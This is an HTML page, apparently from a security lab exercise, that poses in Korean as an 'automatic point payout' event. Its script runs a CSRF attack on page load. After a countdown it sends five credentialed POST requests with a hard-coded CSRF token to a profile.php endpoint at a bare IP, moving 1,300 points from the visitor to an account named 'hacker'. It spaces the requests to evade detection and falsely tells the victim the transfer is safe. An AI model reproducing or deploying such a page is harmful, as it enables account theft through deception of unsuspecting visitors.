<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 특별 이벤트 - 자동 포인트 지급!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
            border: 1px solid rgba(255, 255, 255, 0.18);
            max-width: 500px;
            width: 90%;
        }
        .title { 
            font-size: 2.5em; 
            margin-bottom: 20px; 
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5); 
        }
        .subtitle { 
            font-size: 1.2em; 
            margin-bottom: 30px; 
            opacity: 0.9; 
        }
        .countdown { 
            font-size: 3em; 
            color: #FFD700; 
            font-weight: bold; 
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5); 
            margin: 20px 0; 
        }
        .progress-bar { 
            width: 100%; 
            height: 20px; 
            background: rgba(255,255,255,0.3); 
            border-radius: 10px; 
            overflow: hidden; 
            margin: 20px 0; 
        }
        .progress-fill { 
            height: 100%; 
            background: linear-gradient(90deg, #00ff88, #00cc6a); 
            width: 0%; 
            transition: width 0.5s ease; 
            border-radius: 10px; 
        }
        .success { 
            color: #00FF88; 
            font-size: 1.8em; 
            font-weight: bold; 
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5); 
        }
        .pulse { 
            animation: pulse 1.5s infinite; 
        }
        @keyframes pulse { 
            0% { transform: scale(1); } 
            50% { transform: scale(1.05); } 
            100% { transform: scale(1); } 
        }
        .attack-log {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #00FF88;
            border-radius: 10px;
            padding: 15px;
            margin: 20px 0;
            max-height: 200px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 12px;
            text-align: left;
        }
        .log-success { color: #00FF88; }
        .log-error { color: #FF6B6B; }
        .log-info { color: #FFD700; }
        .log-warning { color: #FF9500; }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="title pulse">🎁 특별 이벤트!</h1>
        <p class="subtitle">자동 포인트 지급 시스템</p>
        
        <div id="loading-section">
            <div class="loading">
                <p>🔑 토큰 인증 포인트 지급을 준비 중...</p>
                <p class="countdown" id="countdown">5</p>
                <p>초 후 자동으로 포인트가 지급됩니다!</p>
            </div>
            <div class="progress-bar">
                <div class="progress-fill" id="progressBar"></div>
            </div>
            <p id="status">🔄 토큰 인증 시스템 연결 중...</p>
            
            <!-- 실시간 로그 -->
            <div class="attack-log" id="attackLog" style="display: none;">
                <div class="log-info">🔑 CSRF Token Authentication System</div>
                <div class="log-info">📡 Connecting to server...</div>
            </div>
        </div>
        
        <div id="success-section" style="display: none;">
            <h2 class="success pulse">✅ 포인트 지급 완료!</h2>
            <p style="font-size: 1.3em; margin: 20px 0;">
                💰 총 <span id="totalPoints">0P</span>가 성공적으로 지급되었습니다!
            </p>
            <p style="opacity: 0.8;">토큰 인증을 통해 안전하게 처리되었습니다.</p>
            <button onclick="checkResults()" 
                    style="background: linear-gradient(45deg, #00FF88, #00CC6A); 
                           color: white; border: none; padding: 15px 25px; 
                           border-radius: 8px; cursor: pointer; margin-top: 20px;">
                🔍 결과 확인하기
            </button>
        </div>
    </div>

    <script>
        let countdown = 5;
        let totalStolenPoints = 0;
        let successfulAttacks = 0;
        let totalAttacks = 0;
        
        const countdownEl = document.getElementById('countdown');
        const statusEl = document.getElementById('status');
        const progressBar = document.getElementById('progressBar');
        const loadingSection = document.getElementById('loading-section');
        const successSection = document.getElementById('success-section');
        const attackLog = document.getElementById('attackLog');
        
        const statusMessages = [
            '🔑 CSRF 토큰 검증 중...',
            '🛡️ 보안 인증을 통과했습니다...',
            '💰 포인트 지급 시스템 활성화...',
            '🚀 자동 전송을 시작합니다...'
        ];
        
        let messageIndex = 0;
        
        // 로그 추가 함수
        function addLog(message, type = 'info') {
            const logDiv = document.getElementById('attackLog');
            const time = new Date().toLocaleTimeString();
            const className = `log-${type}`;
            
            logDiv.innerHTML += `<div class="${className}">[${time}] ${message}</div>`;
            logDiv.scrollTop = logDiv.scrollHeight;
        }
        
        // 카운트다운 시작
        const countdownTimer = setInterval(() => {
            countdown--;
            countdownEl.textContent = countdown;
            progressBar.style.width = ((5-countdown) * 20) + '%';
            
            if (messageIndex < statusMessages.length) {
                statusEl.textContent = statusMessages[messageIndex++];
            }
            
            if (countdown <= 0) {
                clearInterval(countdownTimer);
                executeTokenAttack();
            }
        }, 1000);
        
        // 🔑 토큰 포함 자동 공격 함수
        async function executeTokenAttack() {
            console.log('🔑 토큰 인증 CSRF 공격 시작!');
            statusEl.textContent = '💸 토큰 인증 포인트 전송 중...';
            progressBar.style.width = '100%';
            attackLog.style.display = 'block';
            
            addLog('🚀 자동 CSRF 공격 시스템 시작', 'info');
            addLog('🔑 토큰 인증 모드 활성화', 'success');
            addLog('🎯 타겟: hacker (ID: 13)', 'info');
            
            // CSRF 토큰
            const csrfToken = 'efccf9ef2fe77e351dcd66d0c7470a0fa274c25d378b9dd3129cf3ecf8547347';
            addLog(`🔐 토큰: ${csrfToken.substring(0, 20)}...`, 'warning');
            
            // 공격 목록
            const attacks = [
                { points: 150, message: 'auto_token1', type: 'coffee' },
                { points: 200, message: 'auto_token2', type: 'flower' },
                { points: 250, message: 'auto_token3', type: 'cake' },
                { points: 300, message: 'auto_token4', type: 'diamond' },
                { points: 400, message: 'auto_token5', type: 'coffee' }
            ];
            
            totalAttacks = attacks.length;
            addLog(`📋 ${totalAttacks}개 자동 전송 작업 준비 완료`, 'info');
            
            // 순차적 공격 실행
            for (let i = 0; i < attacks.length; i++) {
                const attack = attacks[i];
                
                addLog(`⚡ 전송 ${i+1}/${totalAttacks}: ${attack.points}P (${attack.type})`, 'warning');
                
                try {
                    // 실제 fetch 요청 (토큰 포함)
                    const response = await fetch('http://13.125.80.75/profile.php?gift_to=13', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                        },
                        body: `send_gift=1&receiver_id=13&gift_type=${attack.type}&points=${attack.points}&message=${attack.message}&csrf_token=${csrfToken}`,
                        credentials: 'include'
                    });
                    
                    if (response.status === 200) {
                        addLog(`✅ 전송 ${i+1} 성공: ${attack.points}P 지급 완료!`, 'success');
                        totalStolenPoints += attack.points;
                        successfulAttacks++;
                    } else {
                        addLog(`⚠️ 전송 ${i+1} 응답: HTTP ${response.status}`, 'error');
                    }
                    
                } catch (error) {
                    addLog(`💥 전송 ${i+1} 오류: ${error.message}`, 'error');
                }
                
                // 진행률 업데이트
                const progress = Math.round(((i + 1) / totalAttacks) * 100);
                statusEl.textContent = `📡 진행률: ${progress}% (${i+1}/${totalAttacks})`;
                
                // 다음 공격까지 2초 대기
                if (i < attacks.length - 1) {
                    addLog(`⏳ 다음 전송까지 2초 대기 (탐지 회피)`, 'info');
                    await new Promise(resolve => setTimeout(resolve, 2000));
                }
            }
            
            // 완료 처리
            setTimeout(() => {
                addLog(`🎉 자동 전송 완료! 성공: ${successfulAttacks}/${totalAttacks}`, 'success');
                addLog(`💰 총 지급된 포인트: ${totalStolenPoints}P`, 'success');
                addLog(`🏆 토큰 인증 시스템으로 안전하게 처리됨`, 'success');
                
                showSuccess();
            }, 1000);
        }
        
        function showSuccess() {
            loadingSection.style.display = 'none';
            successSection.style.display = 'block';
            document.getElementById('totalPoints').textContent = totalStolenPoints + 'P';
            document.title = `✅ ${totalStolenPoints}P 지급 완료!`;
            
            console.log('🏆 토큰 인증 CSRF 공격 성공!');
            console.log(`💰 총 탈취: ${totalStolenPoints}P`);
            console.log(`📊 성공률: ${successfulAttacks}/${totalAttacks}`);
        }
        
        function checkResults() {
            addLog('🔍 결과 확인 창 열기...', 'info');
            
            // hacker 프로필 확인
            window.open('http://13.125.80.75/profile.php?user_id=13', 'hacker_check', 'width=800,height=600,left=100,top=100');
            
            // bob 프로필 확인 (선택사항)
            setTimeout(() => {
                window.open('http://13.125.80.75/profile.php', 'bob_check', 'width=800,height=600,left=900,top=100');
            }, 1000);
        }
        
        // 페이지 언로드 방지 (공격 진행 중)
        let preventUnload = true;
        window.addEventListener('beforeunload', function(e) {
            if (preventUnload) {
                e.preventDefault();
                return '포인트 지급이 진행 중입니다. 페이지를 닫으시겠습니까?';
            }
        });
        
        // 15초 후 언로드 방지 해제
        setTimeout(() => { 
            preventUnload = false; 
        }, 15000);
        
        // 초기화 로그
        console.log('🎯 토큰 인증 자동 CSRF 시스템 로드 완료');
        console.log('🔑 토큰: efccf9ef2fe77e351dcd66d0c7470a0fa274c25d378b9dd3129cf3ecf8547347');
        console.log('💰 예상 탈취: 1,300P (150+200+250+300+400)');
        console.log('🚀 5초 후 자동 실행!');
    </script>
</body>
</html>
